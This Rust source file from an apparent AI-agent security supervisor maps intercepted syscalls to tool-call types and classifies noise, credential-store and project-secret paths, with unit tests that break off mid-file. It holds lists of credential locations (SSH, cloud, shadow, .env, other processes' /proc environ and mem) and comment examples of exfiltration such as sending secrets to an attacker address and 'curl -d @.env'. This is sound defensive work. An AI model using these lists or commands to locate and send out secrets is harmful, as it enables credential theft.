// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Maps intercepted OS-level syscall events to the proxy's `ToolCallType`.
//!
//! This module is the convergence point between the supervisor's syscall
//! interception layer and the proxy's security pipeline. Both WASM-originated
//! and OS-level tool calls produce the same `ToolCallType`, so they flow
//! through the identical filter pipeline.

use sha2::{Digest, Sha256};

use crate::interceptor::{OpenFlags, SyscallKind};
use grith_proxy::types::ToolCallType;

/// Compute a SHA-256 hash of the file path as a stable identifier for
/// DLP content scanning. At syscall-entry time we do not have access to
/// the actual file content being written (the data is in the tracee's
/// user-space buffer), so we hash the target path. This gives the DLP
/// pipeline a non-empty, deterministic fingerprint to correlate with.
///
/// In the future this could be extended to read partial content from the
/// tracee's write buffer via `PTRACE_PEEKDATA` and hash that instead.
fn compute_path_hash(path: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(path.as_bytes());
    let result = hasher.finalize();
    format!("sha256:{}", hex::encode(result))
}

/// Convert a `SyscallKind` to the proxy's `ToolCallType`.
///
/// Returns `None` for syscalls that should be filtered out (noise), such as
/// fd-only reads/writes without a resolved path, `ProcessFork`, regular
/// `NetSendTo` (datagram to a connected socket), `PipeCreate`, and `SocketPair`.
///
/// `NetSendTo` with a `raw:` address (AF_PACKET / AF_NETLINK sockets) is
/// treated as `NetConnect` so the egress filter can score and deny it.
pub fn to_tool_call_type(kind: &SyscallKind) -> Option<ToolCallType> {
    match kind {
        SyscallKind::FileOpen { path, flags } => match flags {
            OpenFlags::ReadOnly => Some(ToolCallType::FileRead { path: path.clone() }),
            OpenFlags::WriteOnly | OpenFlags::Create | OpenFlags::Truncate => {
                Some(ToolCallType::FileWrite {
                    path: path.clone(),
                    content_hash: compute_path_hash(path),
                })
            }
            OpenFlags::Append => Some(ToolCallType::FileAppend { path: path.clone() }),
            OpenFlags::ReadWrite => Some(ToolCallType::FileWrite {
                path: path.clone(),
                content_hash: compute_path_hash(path),
            }),
        },
        SyscallKind::FileWrite {
            path: Some(path), ..
        } => Some(ToolCallType::FileWrite {
            path: path.clone(),
            content_hash: compute_path_hash(path),
        }),
        SyscallKind::FileRead {
            path: Some(path), ..
        } => Some(ToolCallType::FileRead { path: path.clone() }),
        SyscallKind::FileDelete { path } => Some(ToolCallType::FileDelete { path: path.clone() }),
        // Link creation. `ToolCallType::path()` returns the target, so every
        // path-based filter scores what the link exposes rather than the
        // benign new name (go-live review B2/B3).
        SyscallKind::FileLink {
            target,
            link_path,
            symbolic,
        } => Some(ToolCallType::FileLink {
            target: target.clone(),
            link_path: link_path.clone(),
            symbolic: *symbolic,
        }),
        SyscallKind::FileRename { old_path, new_path } => Some(ToolCallType::FileRename {
            old_path: old_path.clone(),
            new_path: new_path.clone(),
        }),
        SyscallKind::FileChmod { path, mode } => Some(ToolCallType::FileChmod {
            path: path.clone(),
            mode: *mode,
        }),
        SyscallKind::DirCreate { path, .. } => Some(ToolCallType::DirCreate { path: path.clone() }),
        SyscallKind::DirList { path } => Some(ToolCallType::DirList { path: path.clone() }),
        SyscallKind::ProcessExec { path, args } => Some(ToolCallType::ProcessSpawn {
            command: path.clone(),
            args: args.clone(),
        }),
        SyscallKind::NetConnect { address, port, .. } => Some(ToolCallType::NetConnect {
            address: address.clone(),
            port: *port,
        }),
        SyscallKind::NetBind { address, port, .. } => Some(ToolCallType::NetListen {
            address: address.clone(),
            port: *port,
        }),
        // Raw-socket sendto (AF_PACKET): classify.rs labelled the address
        // "raw:af_packet". Map through to NetConnect so the egress filter can
        // evaluate and deny it. AF_NETLINK is allowed upstream (kernel
        // messaging), so it never reaches here as a "raw:" address.
        SyscallKind::NetSendTo { address, port } if address.starts_with("raw:") => {
            Some(ToolCallType::NetConnect {
                address: address.clone(),
                port: *port,
            })
        }
        // Explicit-destination datagram send on an *unconnected* socket
        // (go-live review B13). This was noise, so
        // `sendto(fd, secret, ..., &attacker_addr, ...)` egressed to an
        // arbitrary destination with no evaluation and no audit record — the
        // same hole as the connected-write path, reached without even needing
        // a connect. Surfaced as NetConnect so it flows through the existing
        // egress path unchanged.
        //
        // A send with no explicit destination arrives here with an empty
        // address: that is a connected socket, already surfaced against its
        // recorded peer before classification.
        SyscallKind::NetSendTo { address, port } if is_scorable_datagram_destination(address) => {
            Some(ToolCallType::NetConnect {
                address: address.clone(),
                port: *port,
            })
        }
        // IoUringSetup is hard-denied in event_handler before reaching here;
        // this arm is unreachable in practice but makes the mapping explicit.
        SyscallKind::IoUringSetup => None,
        // RawSocketCreate is hard-denied in event_handler before reaching here;
        // this arm is unreachable in practice but makes the mapping explicit.
        SyscallKind::RawSocketCreate { .. } => None,
        // PR 6 Phase A: KernelModuleOp / KexecLoad are hard-denied in
        // event_handler before reaching here. Match explicitly so an
        // accidental routing-through is a compile-time error.
        SyscallKind::KernelModuleOp { .. } | SyscallKind::KexecLoad { .. } => None,
        // Self-filter install is decided in event_handler before classification
        // (deny the NEW_LISTENER escape, observe-or-allow the rest). Matched
        // explicitly so it never falls into the auto-allow catch-all.
        SyscallKind::SeccompInstall { .. } => None,
        // PR 6 Phase D: ArchPrivilegedOp is hard-denied in
        // event_handler before reaching here.
        SyscallKind::ArchPrivilegedOp { .. } => None,
        // Go-live review B1: ForeignAbiSyscall is hard-denied in
        // event_handler before reaching here. Matched explicitly — the
        // catch-all below means "not security-relevant", which the handler
        // turns into a silent allow, so letting a fail-closed variant reach
        // it would invert its meaning. Note this is defence in depth, not a
        // compile-time guarantee — the `_ =>` catch-all below still exists,
        // so removing this arm would silently restore the auto-allow.
        SyscallKind::ForeignAbiSyscall { .. } => None,
        // PR 6 Phase B: category-2 syscalls map to dedicated
        // ToolCallType variants. operation-risk scores +5.0 baseline
        // → QUEUE by default. Profile capability grants can lower.
        SyscallKind::OwnershipChange {
            path,
            new_uid,
            new_gid,
            ..
        } => Some(ToolCallType::OwnershipChange {
            target: path.clone(),
            new_uid: *new_uid,
            new_gid: *new_gid,
        }),
        SyscallKind::FilesystemMutation {
            op,
            source,
            target,
            fstype,
        } => Some(ToolCallType::FilesystemMutation {
            op: format!("{op:?}").to_ascii_lowercase(),
            source: source.clone(),
            target: target.clone(),
            fstype: fstype.clone(),
        }),
        // A decoded D-Bus method call the supervisor's allowlist refused.
        // Mapped to its own variant rather than to `NetConnect`: the egress
        // filter de-scores Control-class unix sockets to 0.0 (PR #126), so
        // routing it there would score the call at 0.5 and auto-allow the
        // exact operation this path exists to surface.
        SyscallKind::DbusMethodCall {
            socket,
            destination,
            interface,
            member,
            ..
        } => Some(ToolCallType::DbusMethodCall {
            socket: socket.clone(),
            destination: destination.clone(),
            interface: interface.clone(),
            member: member.clone(),
        }),
        SyscallKind::CrossProcessAccess { op, target_pid } => {
            Some(ToolCallType::CrossProcessAccess {
                op: format!("{op:?}").to_ascii_lowercase(),
                target_pid: *target_pid,
            })
        }
        // PR 6 Phase C: namespace primitive. The supervisor's
        // `event_handler.rs` short-circuits this to a silent allow
        // when the calling binary is on the profile's
        // `namespace_users` list. When that carveout doesn't match,
        // the call reaches the proxy and `operation-risk` scores
        // +5.0 → QUEUE.
        SyscallKind::NamespaceOp { syscall, flags } => Some(ToolCallType::NamespaceOp {
            syscall: format!("{syscall:?}").to_ascii_lowercase(),
            flags: *flags,
        }),
        // Filtered out: fd-only reads/writes without path, ProcessFork,
        // regular NetSendTo (connected datagrams), PipeCreate, SocketPair
        _ => None,
    }
}

/// True when an explicit datagram destination is worth scoring as egress
/// (go-live review B13).
///
/// Excluded, because scoring them would cost prompts without closing an
/// exfiltration path:
///
/// * **Empty** — a connected socket with no explicit destination. Already
///   surfaced against its recorded peer before this point.
/// * **Unix sockets and bare paths** — not network egress.
/// * **Loopback and unspecified** — not egress at all, and the bulk of
///   datagram volume (DNS to `127.0.0.53`, local services).
/// * **Link-local multicast and broadcast** — mDNS (`224.0.0.251`,
///   `ff02::fb`), SSDP (`239.255.255.250`) and DHCP discovery. These cannot
///   cross a router, so they do not reach an attacker-controlled host, and
///   they are emitted routinely by desktop and container tooling.
///
/// Everything else — any routable unicast address, and any multicast wide
/// enough to leave the segment — is scored.
fn is_scorable_datagram_destination(address: &str) -> bool {
    if address.is_empty() || address.starts_with("unix:") || address.starts_with('/') {
        return false;
    }
    let Ok(ip) = address.parse::<std::net::IpAddr>() else {
        // A hostname here would be unusual (sendto takes a sockaddr), but an
        // unparseable destination is not something to wave through.
        return true;
    };
    if ip.is_loopback() || ip.is_unspecified() {
        return false;
    }
    match ip {
        std::net::IpAddr::V4(v4) => {
            if v4.is_broadcast() {
                return false;
            }
            // 224.0.0.0/24 — the link-local multicast block (mDNS, LLMNR).
            if v4.is_multicast() && v4.octets()[..3] == [224, 0, 0] {
                return false;
            }
            // 239.255.255.250 — SSDP/UPnP discovery.
            if v4.octets() == [239, 255, 255, 250] {
                return false;
            }
            true
        }
        std::net::IpAddr::V6(v6) => {
            if let Some(mapped) = v6.to_ipv4_mapped() {
                return is_scorable_datagram_destination(&mapped.to_string());
            }
            // ff02::/16 — link-local scope multicast.
            !(v6.is_multicast() && v6.segments()[0] & 0xff0f == 0xff02)
        }
    }
}

/// True for ANOTHER process's environment or memory under `/proc`
/// (`/proc/<pid>/environ` or `/proc/<pid>/mem` where `<pid>` is numeric) — a
/// cross-process secret-theft vector that must not be noise-exempt. The
/// caller's own (`/proc/self/*`, `/proc/thread-self/*`) is benign and stays
/// exempt. (Research doc §5.1 #1.)
pub fn is_cross_process_secret_proc_path(path: &str) -> bool {
    let Some(rest) = path.strip_prefix("/proc/") else {
        return false;
    };
    if rest.starts_with("self/") || rest.starts_with("thread-self/") {
        return false;
    }
    let mut parts = rest.splitn(2, '/');
    let pid = parts.next().unwrap_or("");
    let sub = parts.next().unwrap_or("");
    !pid.is_empty() && pid.bytes().all(|b| b.is_ascii_digit()) && (sub == "environ" || sub == "mem")
}

/// Check if a path should be filtered as noise (internal temp files, etc.).
///
/// These are paths that are accessed frequently by runtime internals but are
/// not meaningful from a security perspective.
pub fn is_noise_path(path: &str) -> bool {
    // /proc is noise EXCEPT another process's environment/memory, which leak
    // that process's secrets (env vars, in-memory keys) — those must reach the
    // proxy, not be silently exempt (research doc §5.1 #1). /proc/self/* and
    // /proc/thread-self/* (the caller's own) stay exempt.
    (path.starts_with("/proc/") && !is_cross_process_secret_proc_path(path))
        || path.starts_with("/sys/")
        || path.starts_with("/dev/null")
        || path.starts_with("/dev/urandom")
        || path.starts_with("/dev/random")
        || path.starts_with("/dev/pts/")
        || path.starts_with("/dev/tty")
        // /dev/fd/N is just a reference to an FD the process already holds.
        // The originating openat was already intercepted at open time, so
        // there is no real authority to grant here. Same reasoning applies
        // to /dev/stdin|stdout|stderr (symlinks into /dev/fd/0..2).
        || path.starts_with("/dev/fd/")
        || path == "/dev/stdin"
        || path == "/dev/stdout"
        || path == "/dev/stderr"
        || path.starts_with("/etc/ssl/")
        || path.starts_with("/etc/ca-certificates/")
        || path.starts_with("/usr/share/ca-certificates/")
        || path.starts_with("/usr/lib/ssl/")
        || path.starts_with("/usr/local/ssl/")     // OpenSSL default cert dir
        || path.starts_with("/etc/ld.so.")        // dynamic linker cache/config
        || path.starts_with("/etc/nsswitch")       // name service switch (DNS resolution)
        || path.starts_with("/etc/resolv.conf")    // DNS resolver config
        || path.starts_with("/etc/hosts")          // static hostname resolution
        || path.starts_with("/etc/hostname")       // machine hostname
        || path.starts_with("/etc/localtime")      // timezone
        || path.starts_with("/etc/gai.conf")       // getaddrinfo config
        || path.starts_with("/etc/machine-id")     // systemd machine id
        || path.starts_with("/etc/dpkg/")          // dpkg config
        || path.starts_with("/etc/apt/")           // apt config
        || path.starts_with("/etc/alternatives/")  // Debian alternatives
        || path.starts_with("/etc/default/")       // system defaults
        || path.starts_with("/etc/lsb-release")    // distro info
        || path.starts_with("/etc/os-release")     // distro info
        || path.starts_with("/etc/mime.types")     // MIME type mappings
        || path.starts_with("/etc/shells")         // valid login shells
        || path.starts_with("/etc/login.defs")     // login defaults
        || path.starts_with("/etc/environment")    // system environment
        || path.starts_with("/etc/xdg/")           // XDG base dirs
        || path.starts_with("/etc/ssh/")           // system SSH config (not user keys)
        || path.starts_with("/etc/passwd")         // world-readable user database
        || path.starts_with("/etc/group")          // world-readable group database
        || path.starts_with("/var/lib/dpkg/")      // dpkg database
        || path.starts_with("/var/cache/")         // system caches
        || path.ends_with(".pyc")
        || path.contains("__pycache__")
        || path.starts_with("/tmp/.") // hidden temp files
}

/// Check if a path targets a credential STORE — the strong, low-false-
/// positive core of [`is_sensitive_path`]: credential-bearing directories,
/// system credential stores, grith's own configuration, and cross-process
/// `/proc` secret paths.
///
/// Split out for work/80: `${PROJECT_DIR}`-derived session trust (the launch
/// cwd) must never noise-allow these, no matter where the session was
/// launched from. The weaker name-based signals (`.env`, `*.pem`, keyword
/// filenames) are deliberately NOT here — inside a genuine project tree they
/// are everyday files (dotenv configs, TLS test fixtures), and blocking
/// project trust for them would re-open the prompt-flood class this repo has
/// repeatedly fought. Those stay covered by [`is_sensitive_path`] everywhere
/// project trust does not reach.
pub fn is_credential_store_path(path: &str) -> bool {
    let path_lc = path.replace('\\', "/").to_lowercase();
    let file_name = path_lc
        .trim_end_matches('/')
        .split('/')
        .next_back()
        .unwrap_or_default();

    // Grith's own configuration files — self-protection.
    // A supervised tool must never silently read or modify grith's
    // configuration, learned rules, reputation data, or credentials.
    if path_lc.contains("/.config/grith/") || path_lc.contains("/config/grith/") {
        return true;
    }

    // Credential-bearing directories. Probed with a trailing slash appended
    // so the DIRECTORY itself counts too — `chmod`/`rename`/`rmdir` of
    // `~/proj/.aws` is as store-touching as a file inside it.
    let credential_dirs = [
        "/.ssh/",
        "/.gnupg/",
        "/.pki/",
        "/.aws/",
        "/.azure/",
        "/.kube/",
        "/.docker/",
        "/.config/gcloud/",
    ];
    let dir_probe = if path_lc.ends_with('/') {
        path_lc.clone()
    } else {
        format!("{path_lc}/")
    };
    if credential_dirs.iter().any(|d| dir_probe.contains(d)) {
        return true;
    }

    // Exact-filename credential files: near-zero-FP names that are ALSO the
    // taint filter's sensitive-source list — if project trust noise-allowed
    // their read, no taint would register and exfil scoring could never
    // fire (research doc §5.1 #4 superset invariant). A `~/proj/.npmrc`
    // carrying an _authToken is the everyday shape.
    if matches!(
        file_name,
        ".netrc"
            | ".npmrc"
            | ".pypirc"
            | ".pgpass"
            | ".git-credentials"
            | "id_rsa"
            | "id_ed25519"
            | "id_dsa"
            | "id_ecdsa"
    ) {
        return true;
    }

    // System credential stores
    // Note: /etc/passwd is intentionally excluded — it is world-readable
    // and routinely read by getpwuid/getpwnam in every process. The actual
    // secrets are in /etc/shadow.
    if path_lc.contains("/etc/shadow")
        || path_lc.contains("/etc/sudoers")
        || path_lc.contains("/etc/krb5.keytab")
        || path_lc.contains("/library/keychains/")
    {
        return true;
    }

    // Another process's environment/memory under /proc — cross-process
    // secret theft (also checked in is_sensitive_path; here so project
    // trust can never cover it either).
    is_cross_process_secret_proc_path(path)
}

/// High-value secrets that live INSIDE a project tree by design, and that
/// project-derived trust must therefore not short-circuit.
///
/// [`is_credential_store_path`] is the set that must never be covered no
/// matter where a session was launched; this is the small extension work/80
/// left out and the work/83 review measured a cost for. Every entry is a file
/// whose CONTENT is the secret, whose name is not chosen by chance, and which
/// the proxy already scores well past the queue threshold on a read:
///
/// | path | proxy composite | rules |
/// |---|---:|---|
/// | `<root>/config/master.key` | 8.00 | `path-match:key-files` + `key-material-file` |
/// | `<root>/.env`, `<root>/.env.local` | 6.00 | `path-match:env-file` + `env-file-heuristic` |
/// | `<root>/terraform.tfstate` | 4.00 | `path-match:terraform-state` |
/// | `<root>/certs/client.p12` | 4.00 | `key-material-file` |
///
/// `.env` additionally restores the taint-superset invariant (research doc
/// §5.1 #4) that work/80 used to justify adding `.netrc`/`.npmrc`/`id_rsa` to
/// the store core: `.env` is the FIRST entry in the taint filter's sensitive-
/// source list, so a read that never reaches the proxy registers no taint and
/// the later `curl -d @.env` cannot be scored as exfiltration. Leaving it out
/// while adding the other taint sources was an inconsistency, not a decision.
///
/// **Deliberately NOT here**, with the measurement that decided it — a read
/// of one of these under project trust stays short-circuited:
///
///  * `*.pem` / `*.key` in general. Every such file in this workspace is a
///    false positive: a public AWS RDS CA bundle (`rds-global-bundle.pem`,
///    scored 8.00) and two TLS test fixtures inside a vendored gem
///    (`dhparam.pem`, `client.key`, 8.00 each) — 3 of 3. `master.key` is
///    carved out by exact name because it is a Rails credential, not a
///    fixture.
///  * The substring-keyword rule (`secret`/`token`/`credential`/`apikey` in a
///    filename). `config/secrets.toml` — grith's own config file — scores
///    5.80 on it. That is the 1,573-prompt flood work/83 exists to remove;
///    routing it back through the proxy from the supervisor would undo the
///    point of the series.
///  * `.bash_history` / `.zsh_history`: they live in `$HOME`, which work/80's
///    dangerous-root refusal already keeps project trust away from.
///
/// Committed dotenv TEMPLATES are excluded, mirroring the `exclude` lists on
/// the proxy's `env-file` / `env-file-variants` rules (they hold placeholders,
/// not secrets, and score 0.00). The mirror is the one place this predicate
/// can drift, and it drifts safely in only one direction: guarding a name the
/// proxy would allow costs an evaluation, while EXCLUDING a name the proxy
/// would score costs a missed evaluation — so keep this list no wider than
/// `config/filters/paths.toml`.
const DOTENV_TEMPLATE_NAMES: &[&str] = &[
    ".env.example",
    ".env.sample",
    ".env.template",
    ".env.dist",
    ".env.defaults",
];

pub fn is_high_value_project_secret(path: &str) -> bool {
    let path_lc = path.replace('\\', "/").to_lowercase();
    let file_name = path_lc
        .trim_end_matches('/')
        .split('/')
        .next_back()
        .unwrap_or_default();

    if DOTENV_TEMPLATE_NAMES.contains(&file_name) {
        return false;
    }

    file_name == ".env"
        || file_name.starts_with(".env.")
        // Rails: decrypts config/credentials.yml.enc.
        || file_name == "master.key"
        // Terraform state holds provider credentials and resource secrets in
        // plaintext; a real state file IS the secret.
        || file_name.ends_with(".tfstate")
        || file_name.ends_with(".tfstate.backup")
        // Packaged key material — a bundle, not a certificate.
        || file_name.ends_with(".p12")
        || file_name.ends_with(".pfx")
}

/// The set project-derived (`projdir:`-marked) trust must never short-circuit:
/// credential stores plus the in-project high-value secrets above.
///
/// Narrower than [`is_sensitive_path`] on purpose — see
/// [`is_high_value_project_secret`] for what is left out and why.
pub fn is_project_trust_guarded_path(path: &str) -> bool {
    is_credential_store_path(path) || is_high_value_project_secret(path)
}

/// Check if a path targets a security-sensitive location that should always
/// be evaluated by the proxy, even when `ignore_read_only` noise reduction
/// is enabled.
///
/// Mirrors the heuristics in `grith_proxy::filters::sensitive_path` but as a
/// lightweight boolean gate (no scoring, no severity). A superset of
/// [`is_credential_store_path`] — the strong store classes plus the weaker
/// name-based signals.
pub fn is_sensitive_path(path: &str) -> bool {
    let path_lc = path.replace('\\', "/").to_lowercase();
    let file_name = path_lc.split('/').next_back().unwrap_or_default();

    // The strong classes: credential dirs, system stores, grith config,
    // cross-process /proc.
    if is_credential_store_path(path) {
        return true;
    }

    // Key / certificate files
    if file_name.ends_with(".pem")
        || file_name.ends_with(".key")
        || file_name.ends_with(".p12")
        || file_name.ends_with(".pfx")
        || matches!(file_name, "id_rsa" | "id_ed25519" | "id_dsa" | "id_ecdsa")
    {
        return true;
    }

    // Environment / secret files
    if file_name == ".env" || file_name.starts_with(".env.") {
        return true;
    }

    // Terraform state. The shipped `terraform-state` path rule scores a READ
    // of `*.tfstate` at 4.0 and a real state file holds provider credentials
    // and resource secrets in plaintext, so this gate has to hold it for the
    // proxy to ever see one. It is also what makes the entry in
    // [`is_high_value_project_secret`] reachable on a read: the
    // `ignore_read_only` fast path's FIRST clause is `!is_sensitive_path`, and
    // it returns before the project-trust guard is consulted — a guarded path
    // that is not sensitive is silently auto-allowed. Keep the two sets in
    // that order: `is_project_trust_guarded_path` must stay a SUBSET of this
    // one, pinned by `project_trust_guard_is_a_subset_of_sensitive`.
    if file_name.ends_with(".tfstate") || file_name.ends_with(".tfstate.backup") {
        return true;
    }

    // Credential / history files (read-then-exfil sources). This gate is what
    // the `ignore_read_only` fast-path consults: a read-only open is allowed
    // BEFORE the proxy UNLESS this returns true. So every file the taint filter
    // treats as a sensitive source must appear here too, or the read never
    // reaches the proxy and no taint is registered (research doc §5.1 #4 — this
    // gate must stay a superset of the proxy's sensitive-read classifiers).
    // `.git-credentials`/`.docker/config.json` are already covered above.
    if matches!(
        file_name,
        ".netrc" | ".npmrc" | ".pypirc" | ".pgpass" | ".bash_history" | ".zsh_history"
    ) {
        return true;
    }

    // (Cross-process /proc secret paths — research doc §5.1 #1 — are part
    // of is_credential_store_path above.)

    // Name-keyword rule: a filename that merely *looks* credential-ish. This
    // is the broadest, weakest signal and the biggest false-positive source.
    //
    // work/83 T6: this used to be a hand-maintained substring match kept "in
    // sync" with the proxy heuristic by comment alone, and the two had already
    // drifted (the proxy carried "passwd" and "auth"; this did not). The token
    // predicate now comes from `grith_proxy::paths`, which the proxy filter
    // also calls, so `authority` / `authorize` / `AUTHORS` and rustc's
    // incremental hashes stop matching while `auth.json` and `api-token.txt`
    // keep matching.
    //
    // What this gate is NOT allowed to borrow from the proxy is the proxy's
    // SCORE suppressions. It decides whether a read-only open is EVALUATED at
    // all (`ignore_read_only`), and a call that is never evaluated registers no
    // TAINT — so a suppression here is strictly stronger than a suppression in
    // the filters, and breaks the research-doc §5.1 #4 superset invariant that
    // this function exists to preserve. work/83 briefly applied
    // `is_name_opaque_tree` and `is_non_credential_artifact_filename` here:
    // `/p/target/x/credentials.json`, `/p/gems/token.txt`, `/p/vendor/x/credentials`
    // and `/p/notes/credentials.md` became invisible, even though the taint
    // filter's sensitive-source list classifies every one of them as a
    // credential read. Both predicates are deliberately absent now — the proxy
    // still scores those paths 0.0, which removes the PROMPT while keeping the
    // read visible and taintable, and that is the whole of the false-positive
    // argument.
    //
    // The one carveout that stays is the source-extension one, which predates
    // work/83: a `.php`/`.ts`/`.go` module named `AccessToken.php` is code, and
    // an assistant reading a vendored OAuth SDK would otherwise pay a proxy
    // round-trip per file.
    //
    // NOTE: `file_name` here is lowercased, so camelCase is not available as a
    // token boundary. That only ever makes this gate WIDER than the proxy's
    // (`AccessToken.bin` reaches the proxy and is scored there), which is the
    // safe direction for a noise gate.
    //
    // `/etc/passwd` and `/etc/group` are world-readable databases that every
    // process reads through getpwnam/getgrnam; the actual secrets live in
    // `/etc/shadow`, which `is_credential_store_path` already returns true for.
    // They are named here because "passwd" IS a sensitive token — without this
    // guard the token rule would newly flag them and undo the long-standing
    // decision documented in `is_credential_store_path` and `is_noise_path`.
    let world_readable_user_db =
        path_lc.starts_with("/etc/passwd") || path_lc.starts_with("/etc/group");

    if !world_readable_user_db
        && grith_proxy::paths::name_has_sensitive_token(file_name)
        && !is_source_code_filename(file_name)
    {
        return true;
    }

    false
}

/// True when `file_name` ends in a programming-language source extension — a
/// code module, not a credential file. Used to suppress the weakest
/// substring-keyword sensitivity rule (see [`is_sensitive_path`]). Config /
/// data / script / key extensions (`.env`, `.json`, `.yaml`, `.sh`, `.sql`,
/// `.pem`, …) are deliberately NOT here: those genuinely hold secrets.
fn is_source_code_filename(file_name: &str) -> bool {
    const SOURCE_EXTS: &[&str] = &[
        ".php", ".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs", ".vue", ".py", ".pyi", ".rb", ".go",
        ".rs", ".java", ".kt", ".kts", ".scala", ".cs", ".fs", ".c", ".h", ".cc", ".cpp", ".cxx",
        ".hpp", ".hh", ".hxx", ".swift", ".m", ".mm", ".dart", ".lua", ".ex", ".exs", ".erl",
        ".clj", ".cljs", ".hs", ".ml", ".mli", ".pl", ".pm", ".groovy", ".jl", ".nim", ".zig",
        ".d", ".pas",
    ];
    SOURCE_EXTS.iter().any(|ext| file_name.ends_with(ext))
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── D-Bus method calls ─────────────────────────────────────────

    /// The regression guard that matters most for this variant: the `_ =>`
    /// catch-all below the explicit arms means "not security-relevant", which
    /// the event handler turns into a **silent allow**. A `DbusMethodCall` only
    /// reaches the mapper when the supervisor's curated allowlist already
    /// refused it, so falling through would auto-allow precisely the calls this
    /// path exists to surface.
    #[test]
    fn dbus_method_call_never_falls_into_the_auto_allow_catch_all() {
        let kind = SyscallKind::DbusMethodCall {
            socket: "unix:/run/user/1000/bus".into(),
            destination: Some("org.freedesktop.systemd1".into()),
            interface: Some("org.freedesktop.systemd1.Manager".into()),
            member: Some("StartTransientUnit".into()),
            path: Some("/org/freedesktop/systemd1".into()),
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::DbusMethodCall {
                socket: "unix:/run/user/1000/bus".into(),
                destination: Some("org.freedesktop.systemd1".into()),
                interface: Some("org.freedesktop.systemd1.Manager".into()),
                member: Some("StartTransientUnit".into()),
            })
        );
    }

    /// A message missing header fields still maps — the decision is the
    /// supervisor's, and an unnameable call must reach the proxy rather than
    /// being dropped for want of a label.
    #[test]
    fn dbus_method_call_with_missing_header_fields_still_maps() {
        let kind = SyscallKind::DbusMethodCall {
            socket: "unix:/run/user/1000/bus".into(),
            destination: None,
            interface: None,
            member: None,
            path: None,
        };
        assert!(matches!(
            to_tool_call_type(&kind),
            Some(ToolCallType::DbusMethodCall { .. })
        ));
    }

    // ── FileOpen mappings ──────────────────────────────────────────

    #[test]
    fn file_open_read_only_maps_to_file_read() {
        let kind = SyscallKind::FileOpen {
            path: "/home/user/data.txt".into(),
            flags: OpenFlags::ReadOnly,
        };
        let result = to_tool_call_type(&kind);
        assert_eq!(
            result,
            Some(ToolCallType::FileRead {
                path: "/home/user/data.txt".into()
            })
        );
    }

    #[test]
    fn file_open_write_only_maps_to_file_write() {
        let kind = SyscallKind::FileOpen {
            path: "/tmp/out.log".into(),
            flags: OpenFlags::WriteOnly,
        };
        let result = to_tool_call_type(&kind);
        assert_eq!(
            result,
            Some(ToolCallType::FileWrite {
                path: "/tmp/out.log".into(),
                content_hash: compute_path_hash("/tmp/out.log"),
            })
        );
    }

    #[test]
    fn file_open_create_maps_to_file_write() {
        let kind = SyscallKind::FileOpen {
            path: "/tmp/new_file".into(),
            flags: OpenFlags::Create,
        };
        let result = to_tool_call_type(&kind);
        assert_eq!(
            result,
            Some(ToolCallType::FileWrite {
                path: "/tmp/new_file".into(),
                content_hash: compute_path_hash("/tmp/new_file"),
            })
        );
    }

    #[test]
    fn file_open_truncate_maps_to_file_write() {
        let kind = SyscallKind::FileOpen {
            path: "/tmp/trunc.dat".into(),
            flags: OpenFlags::Truncate,
        };
        let result = to_tool_call_type(&kind);
        assert_eq!(
            result,
            Some(ToolCallType::FileWrite {
                path: "/tmp/trunc.dat".into(),
                content_hash: compute_path_hash("/tmp/trunc.dat"),
            })
        );
    }

    #[test]
    fn file_open_append_maps_to_file_append() {
        let kind = SyscallKind::FileOpen {
            path: "/var/log/app.log".into(),
            flags: OpenFlags::Append,
        };
        let result = to_tool_call_type(&kind);
        assert_eq!(
            result,
            Some(ToolCallType::FileAppend {
                path: "/var/log/app.log".into()
            })
        );
    }

    #[test]
    fn file_open_read_write_maps_to_file_write() {
        let kind = SyscallKind::FileOpen {
            path: "/tmp/rw.dat".into(),
            flags: OpenFlags::ReadWrite,
        };
        let result = to_tool_call_type(&kind);
        assert_eq!(
            result,
            Some(ToolCallType::FileWrite {
                path: "/tmp/rw.dat".into(),
                content_hash: compute_path_hash("/tmp/rw.dat"),
            })
        );
    }

    // ── fd-based reads/writes with resolved path ───────────────────

    #[test]
    fn file_write_with_path_maps_to_file_write() {
        let kind = SyscallKind::FileWrite {
            fd: 3,
            path: Some("/home/user/output.bin".into()),
        };
        let result = to_tool_call_type(&kind);
        assert_eq!(
            result,
            Some(ToolCallType::FileWrite {
                path: "/home/user/output.bin".into(),
                content_hash: compute_path_hash("/home/user/output.bin"),
            })
        );
    }

    #[test]
    fn file_write_without_path_returns_none() {
        let kind = SyscallKind::FileWrite { fd: 5, path: None };
        assert_eq!(to_tool_call_type(&kind), None);
    }

    #[test]
    fn file_read_with_path_maps_to_file_read() {
        let kind = SyscallKind::FileRead {
            fd: 4,
            path: Some("/etc/hosts".into()),
        };
        let result = to_tool_call_type(&kind);
        assert_eq!(
            result,
            Some(ToolCallType::FileRead {
                path: "/etc/hosts".into()
            })
        );
    }

    #[test]
    fn file_read_without_path_returns_none() {
        let kind = SyscallKind::FileRead { fd: 7, path: None };
        assert_eq!(to_tool_call_type(&kind), None);
    }

    // ── File operations ────────────────────────────────────────────

    #[test]
    fn file_delete_maps_correctly() {
        let kind = SyscallKind::FileDelete {
            path: "/tmp/old_file".into(),
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::FileDelete {
                path: "/tmp/old_file".into()
            })
        );
    }

    #[test]
    fn file_rename_maps_correctly() {
        let kind = SyscallKind::FileRename {
            old_path: "/tmp/a.txt".into(),
            new_path: "/tmp/b.txt".into(),
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::FileRename {
                old_path: "/tmp/a.txt".into(),
                new_path: "/tmp/b.txt".into(),
            })
        );
    }

    #[test]
    fn file_chmod_maps_correctly() {
        let kind = SyscallKind::FileChmod {
            path: "/usr/local/bin/app".into(),
            mode: 0o755,
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::FileChmod {
                path: "/usr/local/bin/app".into(),
                mode: 0o755,
            })
        );
    }

    // ── Directory operations ───────────────────────────────────────

    #[test]
    fn dir_create_maps_correctly() {
        let kind = SyscallKind::DirCreate {
            path: "/home/user/new_dir".into(),
            mode: 0o755,
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::DirCreate {
                path: "/home/user/new_dir".into()
            })
        );
    }

    #[test]
    fn dir_list_maps_correctly() {
